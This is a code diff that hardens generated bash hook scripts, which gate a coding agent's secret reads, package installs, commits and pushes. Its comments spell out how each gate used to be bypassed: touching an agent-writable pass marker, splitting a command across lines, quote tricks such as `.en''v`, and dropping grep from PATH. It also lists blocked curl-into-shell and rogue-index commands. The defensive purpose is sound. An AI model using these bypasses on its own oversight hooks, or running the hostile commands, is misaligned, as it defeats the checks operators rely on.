@@ -270,7 +270,14 @@ mkdir -p "$(dirname "$LOG")" 2>/dev/null || true
 _LOG_MAX=1048576
 _rotate_log(){
   local sz
-  sz="$(wc -c <"$LOG" 2>/dev/null || echo 0)"
+  # [lens A F10 / lens B 15] The guard is load-bearing, not defensive. A
+  # fresh install has no .claude/logs/hooks.log, and redirections are applied
+  # LEFT TO RIGHT: `wc -c <"$LOG" 2>/dev/null` reports the failing INPUT
+  # redirection before `2>/dev/null` is in effect, so every hook printed
+  # `...: No such file or directory` on its first run of a clean install -
+  # shell-error noise attached to a security gate's first decision.
+  [ -f "$LOG" ] || return 0
+  sz="$({ wc -c <"$LOG"; } 2>/dev/null || echo 0)"
   case "$sz" in ''|*[!0-9]*) return 0 ;; esac
   if [ "$sz" -gt "$_LOG_MAX" ]; then
     mv -f "$LOG" "$LOG.1" 2>/dev/null || true
@@ -344,21 +351,89 @@ jget(){
 # "operator disables the gate" trainer.
 #
 # norm_cmd collapses whitespace runs and pads with single spaces, so `case`
-# patterns can token-match. cmd_has_verb anchors to COMMAND POSITION: start
-# of string or just after a ; & | ( separator, allowing an `env` prefix and
-# git's own global options.
+# patterns can token-match. cmd_segments then splits a command into the units
+# at which a NEW command can begin, and cmd_has_verb anchors each segment at
+# its start.
+#
+# NO EXTERNAL BINARY IS USED BY ANY OF THE THREE [lens A F5]. The previous
+# version ran `tr` inside a command substitution and `grep -qE` inside an
+# `if` condition. Both contexts are exempt from `set -e`, and therefore from
+# the ERR trap, so removing `grep` or `tr` from PATH turned EVERY command
+# gate into a silent no-op: rc=0, no message, no log line, no hook_fail. That
+# is the same T-1 class the secrets-gate header says was designed out ("a
+# pure-bash `shopt` cannot fail open that way"); the lesson had been applied
+# to the pattern matcher and not to these two shared helpers. Pure bash
+# cannot fail open that way either.
+#
+# NEWLINE IS A COMMAND SEPARATOR [lens A F2]. `tr -s '[:space:]' ' '` turned
+# `\\n` into a space while the anchor class was `[;&|(]`, which does not
+# contain a space - so any verb on a second line was unreachable and
+# `git add -A\\ngit commit -m wip` exited 0 on spec-gate-commit, test-gate and
+# ci-mirror. Multi-line is the normal shape of an agent's Bash call, not an
+# exotic one. norm_cmd now normalizes WITHIN lines and preserves the line
+# structure; cmd_segments splits on newlines as well as `;&|()`.
 #
 # KNOWN AND ACCEPTED LIMITATION: a verb inside a quoted argument to another
 # program - `sh -c "git commit"` - no longer matches. Substring matching did
 # catch that, at the cost of every false positive above. Anchoring is the
 # recommended trade in the upstream report; it is recorded here rather than
-# left for the next reader to rediscover.
-norm_cmd(){ printf ' %s ' "$(printf '%s' "${1:-}" | tr -s '[:space:]' ' ')"; }
+# left for the next reader to rediscover (docs/deferred-backlog.md J-1).
+
+# norm_cmd "<cmd>" -> whitespace-normalized, one line per input line, each
+# padded with single spaces so `case` patterns can token-match.
+norm_cmd(){
+  local _s="${1:-}" _line _out=""
+  _s="${_s//$'\\t'/ }"; _s="${_s//$'\\r'/ }"
+  _s="${_s//$'\\v'/ }"; _s="${_s//$'\\f'/ }"
+  while [ "$_s" != "${_s//  / }" ]; do _s="${_s//  / }"; done
+  while IFS= read -r _line; do
+    _line="${_line# }"; _line="${_line% }"
+    _out="$_out $_line "$'\\n'
+  done <<< "$_s"
+  printf '%s' "$_out"
+  return 0
+}
+
+# cmd_segments "<cmd>" -> one SEGMENT per line: the units at which a new
+# command can begin (newline, ; & | and parens), whitespace-normalized,
+# padded, with any trailing `#` comment removed. This is the single
+# segmentation mechanism in the suite - dependency-gate consumes it too.
+cmd_segments(){
+  local _s _seg
+  _s="$(norm_cmd "${1:-}")"
+  _s="${_s//;/$'\\n'}"
+  _s="${_s//&/$'\\n'}"
+  _s="${_s//|/$'\\n'}"
+  _s="${_s//"("/$'\\n'}"
+  _s="${_s//")"/$'\\n'}"
+  while IFS= read -r _seg; do
+    _seg="${_seg%% \\#*}"
+    _seg="${_seg# }"; _seg="${_seg% }"
+    [ -z "$_seg" ] && continue
+    printf ' %s \\n' "$_seg"
+  done <<< "$_s"
+  return 0
+}
+
+# Command-position prefixes that do not change WHICH program runs: `env` and
+# `sudo` with their own flags, and one or more VAR=value assignment runs. The
+# v2.6.0 anchor admitted only a literal `env `, so `env GIT_AUTHOR=x git
+# commit` and `sudo git commit` fell outside it.
+CMD_PFX='((env|sudo)( +-[^ ]+)* +|[A-Za-z_][A-Za-z0-9_]*=[^ ]* +)*'
 
 # cmd_has_verb "<normalized cmd>" "<tool regex>" "<subcommand regex>"
+# True if the command invokes `<tool> <subcommand>` at a command position.
+# The tool may carry a path (`/usr/bin/git commit`).
 cmd_has_verb(){
-  printf '%s' "$1" | grep -qE \\
-    "(^|[;&|(]) *(env +)?$2( +-[Cc] +[^ ]+| +-[^ ]+)* +$3( |\\$)"
+  local _re="^ *${CMD_PFX}([^ ]*/)?$2( +-[Cc] +[^ ]+| +-[^ ]+)* +$3( |\\$)"
+  local _seg
+  # `if`, not `[[ ]] && return` - a failing `&&` list as the last command of
+  # a loop body trips `set -e` and would route every NON-match through the
+  # ERR trap into hook_fail.
+  while IFS= read -r _seg; do
+    if [[ "$_seg" =~ $_re ]]; then return 0; fi
+  done < <(cmd_segments "$1")
+  return 1
 }
 
 # git_verb "<normalized cmd>" "commit" - the common case.
@@ -704,24 +779,114 @@ exit 0
 #     nothing. A gate that passes without looking is worse than no gate.
 #   * Grep and Glob supply `path`/`pattern` and were unmatched entirely.
 #   * Bash supplies `command`; every never-read path was reachable through a
-#     shell call. Each token of the command is checked as a candidate path.
+#     shell call. Each ARGUMENT of the command is checked as a candidate path.
 CANDIDATES=()
 for _k in file_path notebook_path path pattern; do
   _v="$(jget ".tool_input.$_k")"
   [ -n "$_v" ] && CANDIDATES+=("$_v")
 done
-# Bash: treat each argument token as a candidate path. Quotes are stripped
-# because `git diff -- '*.pem'` must be caught as *.pem, not '*.pem'.
+
+# --- Bash surface: a QUOTE-AWARE tokenizer ---------------------------------
+# The v2.6.0 version was `read -ra _toks <<< "$_cmd"` plus a one-deep quote
+# strip. That was wrong in both directions at once, which is why the two are
+# fixed together - repairing either alone yields a tokenizer that is
+# confidently wrong in the other direction:
+#
+#   [lens A F1, UNDER-match, catastrophic] `read` consumes ONE LINE. Every
+#   token after the first newline was invisible, so `cd /app\\ncat .env`
+#   exited 0 while `cd /app; cat .env` exited 2. Multi-line is the normal
+#   shape of an agent's Bash call, so this disabled the whole P0-2 Bash
+#   surface in ordinary use, with no attacker required.
+#
+#   [lens B finding 4, OVER-match] Splitting on whitespace turned every word
+#   of a quoted argument into its own candidate path, so
+#   `git commit -m "fix the .env loader"` and
+#   `git commit -m "docs: describe secrets/README"` were blocked. RETROFIT.md
+#   1134 is the normative anchor: "Don't block file writes mid-plan ...
+#   Secrets are the only mid-plan exception." The exception is for secrets,
+#   not for prose containing the substring `.env`. This is the same
+#   "operator deletes the gate" pressure the P2-4 comment below describes,
+#   at several times the blast radius, because it reaches every argument of
+#   every shell command.
+#
+# Both follow from tokenizing the way the shell does: split on UNQUOTED
+# whitespace only, and JOIN adjacent quoted and unquoted runs into one token.
+# A quoted argument is then one candidate (its interior words are not paths),
+# while `cat ".env"` still yields `.env` - and, as a bonus, the intra-token
+# quoting of [lens A F8] reassembles: `cat .en''v` yields `.env`.
+_sg_push(){{
+  local _lhs
+  if [ -n "$_CUR" ]; then
+    CANDIDATES+=("$_CUR")
+    # A backslash escapes the next character, so `cat .en\\v` names `.env`.
+    # Emitted as an ADDITIONAL candidate rather than a replacement: deny-list
+    # bias is over-match, and a path may legitimately contain a backslash.
+    case "$_CUR" in
+      *\\\\*) CANDIDATES+=("${{_CUR//\\\\/}}") ;;
+    esac
+    # `F=.env; cat $F` hides the path behind an expansion this gate cannot
+    # perform, but the ASSIGNMENT is in plain sight. Strictly shaped (a
+    # valid shell name, then `=`) so prose does not trip it.
+    case "$_CUR" in
+      [A-Za-z_]*=*)
+        _lhs="${{_CUR%%=*}}"
+        case "$_lhs" in
+          *[!A-Za-z0-9_]*) ;;
+          *) CANDIDATES+=("${{_CUR#*=}}") ;;
+        esac ;;
+    esac
+  fi
+  _CUR=""
+  return 0
+}}
+_sg_raw(){{                     # an UNQUOTED run: split on whitespace
+  local _t="$1" _w _first=1 _trail=0 _arr=()
+  [ -z "$_t" ] && return 0
+  # Shell OPERATORS are not part of a word when unquoted, so they delimit
+  # candidates. Without this the token carries the operator - `cd secrets;
+  # cat prod.yaml` yields `secrets;`, and `cat .env; ls` yields `.env;`,
+  # neither of which matches its pattern: a fail-open on the most ordinary
+  # multi-command line there is. Applied to UNQUOTED runs only, so a `;`
+  # inside a commit message still cannot split it (lens B finding 4).
+  _t="${{_t//;/ }}"; _t="${{_t//&/ }}"; _t="${{_t//|/ }}"
+  _t="${{_t//"("/ }}"; _t="${{_t//")"/ }}"
+  _t="${{_t//</ }}"; _t="${{_t//>/ }}"
+  case "$_t" in [[:space:]]*) _sg_push ;; esac
+  case "$_t" in *[[:space:]]) _trail=1 ;; esac
+  set -f
+  read -ra _arr <<< "$_t"
+  set +f
+  for _w in ${{_arr[@]+"${{_arr[@]}}"}}; do
+    if [ "$_first" = "1" ]; then _CUR="$_CUR$_w"; _first=0
+    else _sg_push; _CUR="$_w"; fi
+  done
+  [ "$_trail" = "1" ] && _sg_push
+  return 0
+}}
+_sg_line(){{
+  local _l="$1" _pre _q _rest _run _pd _ps
+  _CUR=""
+  while : ; do
+    case "$_l" in *[\\"\\']*) ;; *) _sg_raw "$_l"; _sg_push; return 0 ;; esac
+    _pd="${{_l%%\\"*}}"; _ps="${{_l%%\\'*}}"
+    if [ "${{#_pd}}" -le "${{#_ps}}" ]; then _q='"'; _pre="$_pd"
+    else _q="'"; _pre="$_ps"; fi
+    _sg_raw "$_pre"
+    _rest="${{_l#*"$_q"}}"
+    case "$_rest" in
+      *"$_q"*) _run="${{_rest%%"$_q"*}}"; _l="${{_rest#*"$_q"}}" ;;
+      *)       _run="$_rest"; _l="" ;;   # unterminated quote: take the rest
+    esac
+    _CUR="$_CUR$_run"
+    if [ -z "$_l" ]; then _sg_push; return 0; fi
+  done
+}}
 _cmd="$(jget '.tool_input.command')"
 if [ -n "$_cmd" ]; then
-  set -f
-  read -ra _toks <<< "$_cmd"
-  set +f
-  for _t in ${{_toks[@]+"${{_toks[@]}}"}}; do
-    _t="${{_t%\\"}}"; _t="${{_t#\\"}}"
-    _t="${{_t%\\'}}"; _t="${{_t#\\'}}"
-    [ -n "$_t" ] && CANDIDATES+=("$_t")
-  done
+  _CUR=""
+  while IFS= read -r _line; do          # [F1] EVERY line, not just the first
+    _sg_line "$_line"
+  done <<< "$_cmd"
 fi
 if [ "${{#CANDIDATES[@]}}" -eq 0 ]; then
   log "secrets-gate: no path"; exit 0
@@ -743,6 +908,19 @@ mapfile -t PATS <<'PAT_EOF'
 PAT_EOF
 for TARGET in "${{CANDIDATES[@]}}"; do
   base="$(basename -- "$TARGET" 2>/dev/null || printf '%s' "$TARGET")"
+  # [lens B finding 4, THE ONE DELIBERATE RELAXATION IN THIS GATE] The
+  # dotenv TEMPLATE names are conventionally secret-free and committed to
+  # every repo that uses dotenv, so `.env*` blocking `cat .env.example`
+  # blocks a file whose entire purpose is to be read. Exact basenames only -
+  # never a prefix or suffix form - so `.env.example.real` and
+  # `.env.production` are untouched. This is the only place this gate allows
+  # something a previous version blocked; it is asserted as an explicit
+  # exemption in tests/test_hook_behavior.py rather than left implicit.
+  case "$base" in
+    .env.example|.env.sample|.env.template|.env.dist|.env.defaults\\
+    |env.example|env.sample|env.template)
+      log "secrets-gate allow dotenv template $TARGET"; continue ;;
+  esac
   for pat in ${{PATS[@]+"${{PATS[@]}}"}}; do
     [ -z "$pat" ] && continue
     cpat="${{pat//'**'/'*'}}"   # ** -> * for `case`; pure bash, no `sed`
@@ -770,6 +948,16 @@ for TARGET in "${{CANDIDATES[@]}}"; do
     # never by more word characters. So `config.env` and `.env.production`
     # block; `my.envelope.gleam` and `dev.environment.md` do not.
     stem="${{cpat%\\*}}"
+    # [lens A F6, both substrates] 'secrets/**' normalizes to 'secrets/*',
+    # which the anchored form matched only WITH the slash present. So
+    # `Grep{{"path":"secrets"}}` exited 0 - and a Grep whose path is the
+    # directory returns the matching file CONTENTS. `cd secrets; cat
+    # prod.yaml` and `tar cf /tmp/s.tar secrets` were open the same way.
+    # Naming the directory reaches everything under it, so the directory
+    # itself is a candidate for the same block. dstem is empty for patterns
+    # that are not directory globs, and the extra arms are then dead.
+    dstem=""
+    case "$cpat" in */\\*) dstem="${{cpat%/\\*}}" ;; esac
     if [ "$form" = "free" ]; then
       case "$base" in
         $cpat|*$cpat) _hit=1 ;; *) _hit=0 ;;
@@ -782,6 +970,9 @@ for TARGET in "${{CANDIDATES[@]}}"; do
       case "$base" in
         $cpat) _hit=1 ;; *) _hit=0 ;;
       esac
+      if [ "$_hit" = "0" ] && [ -n "$dstem" ]; then
+        case "$base" in $dstem) _hit=1 ;; esac
+      fi
     fi
     if [ "$_hit" = "1" ]; then
       echo "BLOCKED: $TARGET matches never-read pattern $pat" >&2
@@ -795,6 +986,9 @@ for TARGET in "${{CANDIDATES[@]}}"; do
       case "$TARGET" in
         $cpat|*/$cpat) _hit=1 ;; *) _hit=0 ;;
       esac
+      if [ "$_hit" = "0" ] && [ -n "$dstem" ]; then
+        case "$TARGET" in $dstem|*/$dstem) _hit=1 ;; esac
+      fi
     fi
     if [ "$_hit" = "1" ]; then
       echo "BLOCKED: $TARGET matches never-read pattern $pat" >&2
@@ -807,42 +1001,56 @@ exit 0
 '''
 
     if name == "test-gate":
-        cmd = c["test"] or "echo 'TODO: commands.test unset' && exit 1"
+        cmd = c["test"] or \
+            "echo 'TODO: commands.test unset' >&2 && exit 127"
         return _HOOK_HEADER + f'''
-# PreToolUse git commit: block unless tests passed since last source edit.
+# PreToolUse git commit: block unless the configured test command passes.
+#
+# [lens A F4] THE PASS MARKER IS GONE. This gate used to skip the test run
+# when `.claude/.last-test-pass` existed and no watched source file was
+# newer. That marker is gitignored and agent-writable, and NO gate protects
+# it, so `touch .claude/.last-test-pass` - one word, through a Bash call that
+# secrets-gate, dependency-gate and tdd-gate all allow - disabled the test
+# gate for the very next commit. That is the P0-1 class (a gate trusting
+# agent-writable state) reached without an exploit.
+#
+# "Verify the marker's CONTENT instead" was the other option offered. It is
+# not a fix: whatever the gate can compute from the tree, an agent holding a
+# Write tool can compute and write too. The only honest repair is to stop
+# having a trusted input, so the gate now RUNS THE TESTS on every commit
+# attempt. `ci-mirror` already works exactly this way on every push, so this
+# is the suite's existing posture rather than a new one, and the P1-1
+# timeout (600 s) is what bounds it.
+#
+# REMOVED WITH IT: the P2-5 staleness walk (absolute `find` over
+# src/lib/app/test/tests) and backlog I-5's shell-vs-SDK staleness
+# divergence - both were properties of a cache that no longer exists.
 CMD="$(jget '.tool_input.command')"
 NCMD="$(norm_cmd "$CMD")"
 if git_verb "$NCMD" "commit"; then
-    PROJ="${{CLAUDE_PROJECT_DIR:-.}}"
-    MARK="$PROJ/.claude/.last-test-pass"
-    # [upstream P2-5] `find src` used a RELATIVE path while MARK used $PROJ.
-    # In a project with no src/ - or whenever the hook's cwd differed - find
-    # failed silently, newest_src stayed empty, and once .last-test-pass
-    # existed EVERY commit passed with no test run, forever. Watch every
-    # source root that exists, absolutely, and watch test/ too: editing only
-    # tests must invalidate the marker.
-    newest_src=""
-    for d in src lib app test tests; do
-      [ -d "$PROJ/$d" ] || continue
-      hit="$(find "$PROJ/$d" -type f -newer "$MARK" 2>/dev/null | head -1 || true)"
-      if [ -n "$hit" ]; then newest_src="$hit"; break; fi
-    done
-    if [ ! -f "$MARK" ] || [ -n "$newest_src" ]; then
-      echo "Running test gate: {cmd}" >&2
-      set +e
-      ( {cmd} ); rc=$?
-      set -e
-      if [ "$rc" -eq 0 ]; then
-        touch "$MARK"
-      elif [ "$rc" -eq 127 ]; then
-        # [upstream P2-5] Do not claim "tests failing" when the toolchain is
-        # simply absent - that sends the operator to debug the wrong thing.
-        echo "Commit blocked: test command not found (exit 127): {cmd}" >&2
-        echo "Install the toolchain or fix commands.test in bootstrap.config.yaml." >&2
-        exit 2
-      else
-        echo "Commit blocked: tests failing (exit $rc)." >&2; exit 2
-      fi
+    echo "Running test gate: {cmd}" >&2
+    # [lens B finding 3] `set +e` suppresses EXITING; it does NOT disarm an
+    # ERR trap. The previous `set +e; ( {{cmd}} ); rc=$?; set -e` fired the
+    # header's ERR trap on the subshell's non-zero status, so hook_fail ran
+    # BEFORE the rc dispatch below and every failing suite reported
+    # "BLOCKED (fail-closed): unexpected hook error at line N" - the whole
+    # P2-5 fix (127 = toolchain missing vs. a real failure) was dead code,
+    # and the seam-obliged reason string blamed the hook for a red suite.
+    # A command on the left of `||` is exempt from both errexit and the ERR
+    # trap, and the trap is not inherited by the subshell (no `set -E`), so
+    # this reaches the dispatch with the real status.
+    rc=0
+    ( {cmd} ) || rc=$?
+    if [ "$rc" -eq 0 ]; then
+      :
+    elif [ "$rc" -eq 127 ]; then
+      # [upstream P2-5] Do not claim "tests failing" when the toolchain is
+      # simply absent - that sends the operator to debug the wrong thing.
+      echo "Commit blocked: test command not found (exit 127): {cmd}" >&2
+      echo "Install the toolchain or fix commands.test in bootstrap.config.yaml." >&2
+      exit 2
+    else
+      echo "Commit blocked: tests failing (exit $rc)." >&2; exit 2
     fi
 fi
 log "test-gate ok"
@@ -974,27 +1182,47 @@ pkg_name(){{
 # Remote-script execution is the same "unapproved software arrives" class the
 # gate exists for, and no package name is inspectable. Always block. Checked
 # on the WHOLE command and BEFORE segmenting, because the pattern
-# deliberately reads across a pipe.
-if printf '%s' "$NCMD" \\
-   | grep -qE '(curl|wget)[^;&|]*\\|[[:space:]]*(sudo +)?(sh|bash|zsh|python3?|perl|ruby)( |$)'; then
+# deliberately reads across a pipe. Pure bash [lens A F5]: the previous
+# `grep -qE` sat inside an `if` condition, exempt from `set -e` and so from
+# the ERR trap, and removing grep from PATH silently turned this into a
+# no-op instead of failing closed.
+_PIPE_RE='(curl|wget)[^;&|]*\\|[[:space:]]*(sudo +)?(sh|bash|zsh|python3?|perl|ruby)( |$)'
+if [[ "$NCMD" =~ $_PIPE_RE ]]; then
   echo "Dependency gate: piping a downloaded script into a shell is blocked." >&2
   echo "Vendor the installer, review it, then run it explicitly." >&2
   exit 2
 fi
 
+# [lens A F3 residue] An index/registry override redirects an APPROVED
+# package to an attacker-controlled server, so no package-name check can see
+# it: `PIP_INDEX_URL=http://evil.test/simple pip install requests` installs
+# whatever that host serves under the name `requests`. The command-position
+# prefix now admits VAR=value runs (defect 1c), which is exactly where these
+# arrive, so the assignment is inspectable. Tested against the matched HEAD
+# only - i.e. an assignment that is genuinely a prefix of an install
+# invocation - so prose merely naming the variable does not block.
+_IDX_RE='(^| )(PIP_INDEX_URL|PIP_EXTRA_INDEX_URL|PIP_FIND_LINKS|UV_INDEX_URL|UV_EXTRA_INDEX_URL|NPM_CONFIG_REGISTRY|npm_config_registry|YARN_REGISTRY|YARN_NPM_REGISTRY_SERVER|COMPOSER_REPOSITORIES|GOPROXY|GEM_SOURCE)='
+
 TOOLS='(npm|pnpm|yarn|bun|pip[0-9.]*|pipx|poetry|uv|pipenv|cargo|gem|composer|mix|rebar3|gleam|go|deno)'
 VERBS='(install|i|add|get|require|get-deps|deps\\.get)'
+# [lens A F3 residue] Run-without-installing channels. `npx evil-package`,
+# `uvx evil`, `pnpm dlx evil`, `bunx evil`, `npm exec evil` and `yarn dlx
+# evil` all fetch and EXECUTE an unapproved package; the gate exists for
+# "unapproved software arrives", and not installing it first is not a
+# mitigation. NEWLY BLOCKED - see docs/changelog.md. deps.md is the escape
+# hatch, as it is for every other arrival channel.
+RUNNERS='(([^ ]*/)?(npx|uvx|bunx)|([^ ]*/)?(npm|pnpm|yarn|bun) +(dlx|exec))'
 # Command-position prefixes that do not change WHICH program runs, so the
-# install verb is still the verb: `env`/`sudo` with their own flags, and one
-# or more VAR=value assignment runs [v2.6.1 defect 1c - the v2.6.0 anchor
-# admitted only a literal `env `, so `sudo pip install evil`,
-# `FOO=1 npm install evil` and `uv pip install evil` all sailed through,
-# every one of which the v2.5.0 substring match had caught].
-PFX='((env|sudo)( +-[^ ]+)* +|[A-Za-z_][A-Za-z0-9_]*=[^ ]* +)*'
+# install verb is still the verb. Shared with the header's CMD_PFX so the
+# two anchors cannot drift [v2.6.1 defect 1c - the v2.6.0 anchor admitted
+# only a literal `env `, so `sudo pip install evil`, `FOO=1 npm install evil`
+# and `uv pip install evil` all sailed through, every one of which the
+# v2.5.0 substring match had caught].
+PFX="$CMD_PFX"
 # An install invocation at the START of a segment. The tool may carry a path
 # (`/usr/bin/pip install`); `python -m pip install` and `uv pip install` are
 # spelled out because the token at command position is not the installer.
-HEAD="^ *${{PFX}}(python[0-9.]* +-m +pip +install|([^ ]*/)?uv +pip +install|([^ ]*/)?${{TOOLS}} +${{VERBS}})( |$)"
+HEAD="^ *${{PFX}}(python[0-9.]* +-m +pip +install|([^ ]*/)?uv +pip +install|${{RUNNERS}}|([^ ]*/)?${{TOOLS}} +${{VERBS}})( |$)"
 
 # SEGMENT FIRST, then judge each segment on its own [v2.6.1 defects 1a/1b].
 # v2.6.0 searched the whole line for ONE install invocation and got both
@@ -1008,9 +1236,14 @@ HEAD="^ *${{PFX}}(python[0-9.]* +-m +pip +install|([^ ]*/)?uv +pip +install|([^ 
 #       blanked the package list and nothing was inspected at all.
 # Splitting on separators first makes the verdict the OR over segments, which
 # is what a deny-list wants, and makes "no arguments" a per-invocation fact.
-# Newlines are separators too: `norm_cmd` collapses them into spaces, so
-# without this a second line was never at command position.
-# Pure bash - no external binary, so this cannot degrade if `tr` is missing.
+#
+# The segmentation itself now lives in the shared header (`cmd_segments`),
+# which is also what `cmd_has_verb` anchors on, so there is ONE mechanism
+# rather than a local copy here and a different anchor there. It splits on
+# newlines as well as `;&|()` - `norm_cmd` used to collapse a newline into a
+# space, so a second line was never at command position [lens A F2] - strips
+# a trailing `#` comment, and is pure bash, so it cannot degrade if `tr` is
+# missing [lens A F5].
 #
 # KNOWN AND ACCEPTED: a separator inside a quoted string starts a new segment,
 # so `git commit -m "fix; npm install evil"` blocks. Deny-list bias is
@@ -1018,15 +1251,36 @@ HEAD="^ *${{PFX}}(python[0-9.]* +-m +pip +install|([^ ]*/)?uv +pip +install|([^ 
 # odd-quote segments would fix it in the FAIL-OPEN direction, so it is not
 # done. The message names the token, so the cause is legible.
 blocked=""
-segs="${{CMD//;/$'\\n'}}"
-segs="${{segs//&/$'\\n'}}"
-segs="${{segs//|/$'\\n'}}"
-while IFS= read -r seg; do
-  nseg="$(norm_cmd "$seg")"
-  nseg="${{nseg%% \\#*}}"                   # a trailing comment is not a command
-  printf '%s' "$nseg" | grep -qE "$HEAD" || continue
-  # Arguments belonging to THIS segment's verb, and nothing else.
-  rest="$(printf '%s' "$nseg" | sed -E "s@$HEAD@ @")"
+
+# [lens A F9] Value-taking flags. The v2.6.0 list was seven entries long, so
+# EVERY other value-taking flag left its argument to be read as a package
+# name and the gate blocked the wrong token:
+#   pip install --index-url <url> requests  -> "not in deps.md approved
+#                                              list: https://..."
+# The list below is long but the safety does not rest on its completeness:
+# a flag consumes the following token ONLY IF that token is value-SHAPED
+# (a URL, a `:all:`-style spec, a path, a key=value, a version number).
+# That inversion is what makes it safe to include short flags whose meaning
+# differs by ecosystem - `npm install -d evil` and `npm i -f evil` must still
+# block `evil`, and they do, because `evil` is package-shaped.
+is_flag_value(){{
+  case "$1" in
+    ""|*://*|:*|.|./*|../*|/*|~*|*=*|[0-9]*) return 0 ;;
+    *) return 1 ;;
+  esac
+}}
+while IFS= read -r nseg; do
+  [[ "$nseg" =~ $HEAD ]] || continue
+  # Arguments belonging to THIS segment's verb, and nothing else. Pure bash
+  # (the previous `sed -E` was a third external-binary fail-open path).
+  head_txt="${{BASH_REMATCH[0]}}"
+  rest="${{nseg#"$head_txt"}}"
+  if [[ "$head_txt" =~ $_IDX_RE ]]; then
+    echo "Dependency gate: a package-index override is not verifiable." >&2
+    echo "It redirects even an APPROVED package to another server. Remove it," >&2
+    echo "or set the index in the project's own package-manager config." >&2
+    exit 2
+  fi
   # A verb with no arguments is a lockfile restore (`npm install`,
   # `mix deps.get`, `cargo add` alone). Nothing to approve; allow - but only
   # this segment, never the line.
@@ -1036,7 +1290,10 @@ while IFS= read -r seg; do
   set +f
   skip_next=0
   for tok in ${{TOKS[@]+"${{TOKS[@]}}"}}; do
-    if [ "$skip_next" = "1" ]; then skip_next=0; continue; fi
+    if [ "$skip_next" = "1" ]; then
+      skip_next=0
+      if is_flag_value "$tok"; then continue; fi
+    fi
     case "$tok" in
       # A requirements/constraints FILE lists packages this gate cannot see.
       # Allowing it would defeat the gate entirely, so it blocks with its own
@@ -1045,7 +1302,16 @@ while IFS= read -r seg; do
         echo "Dependency gate: cannot verify packages listed in a file." >&2
         echo "Install them explicitly, or approve in .claude/steering/deps.md." >&2
         exit 2 ;;
-      -e|--editable|-t|--target|--prefix|--root|-d|--dest)
+      -i|--index-url|--extra-index-url|--find-links|--no-binary|--only-binary\\
+      |--platform|--python-version|--implementation|--abi|--progress-bar\\
+      |--cache-dir|--log|--proxy|--cert|--client-cert|--trusted-host\\
+      |--config-settings|--report|--timeout|--retries|--exists-action\\
+      |--upgrade-strategy|--src|-e|--editable|-t|--target|--prefix|--root\\
+      |-d|--dest|--registry|--userconfig|--globalconfig|--cache|--workspace\\
+      |-w|--omit|--include|--install-strategy|--before|--tag|--scope\\
+      |--access|--store-dir|--virtual-store-dir|--modules-folder|--reporter\\
+      |--filter|--dir|-C|--manifest-path|--features|--index|--git|--branch\\
+      |--rev|--path|-p|--package|--profile|--bin|--example|--vers|-f)
         skip_next=1; continue ;;
       -*) continue ;;
       .|./*|/*|../*) continue ;;          # local path install, not a registry
@@ -1057,7 +1323,7 @@ while IFS= read -r seg; do
       blocked="$blocked $name_only"
     fi
   done
-done <<< "$segs"
+done < <(cmd_segments "$CMD")
 if [ -n "$blocked" ]; then
   echo "Dependency gate: not in deps.md approved list:$blocked" >&2
   echo "Approve in-session and update .claude/steering/deps.md." >&2
@@ -1087,15 +1353,32 @@ exit 0
     if name == "eval-gate":
         return _HOOK_HEADER + '''
 # PreToolUse git push touching prompt files: require a passed eval.
+#
+# [lens B finding 8] The P1-4 anchoring was applied to spec-gate-commit,
+# test-gate, ci-mirror and dependency-gate, and to the SDK's eval-gate via
+# _git_verb - but the SHELL eval-gate was left substring-matched
+# (`case "$CMD" in *"git push"*`). So `echo "git push"` and a comment
+# mentioning `git push` blocked here while the SDK allowed them: a
+# divergence in the direction the module's own binding rule forbids ("MUST
+# NOT block what the shell allows" reads the other way round only because
+# the shell was the wrong one).
 CMD="$(jget '.tool_input.command')"
-case "$CMD" in
-  *"git push"*)
+NCMD="$(norm_cmd "$CMD")"
+if git_verb "$NCMD" "push"; then
     if git diff --name-only HEAD~1 2>/dev/null | grep -qE 'prompt|\\.md$'; then
+      # [lens A F4, same class as test-gate] `.last-eval-pass` is gitignored
+      # and agent-writable, and `touch`ing it satisfies this gate. Unlike
+      # test-gate there is no configured eval command to run instead, so the
+      # marker is the only mechanism available and is KEPT. The emitted
+      # permissions.deny now refuses Write/Edit to it - defence in depth the
+      # harness enforces - but a Bash `touch` still reaches it, because the
+      # deny list carries no Bash rule. Recorded, not silently tolerated:
+      # docs/deferred-backlog.md J-9.
       MARK="${CLAUDE_PROJECT_DIR:-.}/.claude/.last-eval-pass"
       [ -f "$MARK" ] || { echo "Eval gate: run evals before pushing prompt \
 changes." >&2; exit 2; }
-    fi ;;
-esac
+    fi
+fi
 log "eval-gate ok"
 exit 0
 '''
@@ -1351,6 +1634,19 @@ def _settings_json(cfg):
             for tool in ("Read", "Edit", "Write"):
                 deny.append(f"{tool}({pat})")
         settings["permissions"] = {"deny": deny}
+    # [lens A F4] A gate must not trust an agent-writable file that no gate
+    # protects. test-gate no longer has such a file at all (it runs the tests
+    # every time), but eval-gate's `.last-eval-pass` has no configured eval
+    # command to run instead, so the marker stays and is protected here
+    # instead. These are Write/Edit rules, so a Bash `touch` still reaches
+    # the marker - the deny list carries no `Bash` rule and Claude Code's
+    # path rules do not evaluate command strings. Recorded, not implied:
+    # docs/deferred-backlog.md J-9.
+    if "eval-gate" in hooks:
+        perms = settings.setdefault("permissions", {})
+        marker_deny = perms.setdefault("deny", [])
+        for tool in ("Edit", "Write"):
+            marker_deny.append(f"{tool}(.claude/.last-eval-pass)")
     if cfg["mcp"]["servers"]:
         settings["_note_mcp"] = ("MCP servers are added via `claude mcp add`; "
                                  "see .claude/steering/tools.md")
